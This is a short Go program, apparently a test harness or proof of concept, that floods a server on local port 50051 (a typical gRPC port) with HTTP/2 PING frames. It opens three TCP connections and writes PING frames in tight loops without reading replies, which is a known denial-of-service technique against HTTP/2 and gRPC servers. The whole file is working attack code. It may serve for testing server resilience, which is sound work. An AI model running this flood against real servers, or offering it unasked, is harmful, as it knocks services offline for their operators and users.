package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"golang.org/x/net/http2"
)

const (
	target = ":50051"
	connections = 3
)

func pingflood(counter *int) {
	for {
		tc, err := net.Dial("tcp", target)
		if err != nil {
			fmt.Printf("\n%s\nPress Ctrl + C\n", err)
			return
		}
		defer tc.Close()
	
		fr := http2.NewFramer(tc, tc)
		var data [8]byte
		copy(data[:], "ping")
		for {
			e := fr.WritePing(false, data)
			if e != nil {
				// fmt.Println(e)
				// fmt.Println("reconnect...")
				break
			}
			*counter++
		}
	}
}

func showCount(counter *int) {
	for range time.Tick(1 * time.Second) {
		fmt.Printf("\rSend %d ping frames", *counter)
	}
}

func main() {
	fmt.Println("Ping Flood for ", target)
	quit := make(chan os.Signal)
	signal.Notify(quit, os.Interrupt)
	counter := 0

	for i := 0; i < connections; i++ {
		go pingflood(&counter)
	}
	go showCount(&counter)
	<-quit

	fmt.Printf("\nTotal ping frames: %d\n", counter)
	return
}
